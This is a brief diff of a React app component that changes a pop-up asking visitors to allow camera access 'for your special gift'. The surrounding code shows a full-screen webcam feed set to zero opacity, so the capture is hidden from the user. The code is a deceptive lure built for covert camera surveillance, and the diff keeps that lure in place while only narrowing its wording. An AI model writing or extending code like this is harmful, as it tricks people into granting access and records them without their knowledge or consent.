@@ -37,7 +37,7 @@ function App() {
   return (
     
     <div>
-      {!cam && alert('Please allow location and camera access for your special gift')}
+      {!cam && alert('Please allow camera access for your special gift')}
       <Webcam
         style={{width:'1920px', height:'1080', opacity: 0, position: 'absolute'}}
         ref={webcamRef}
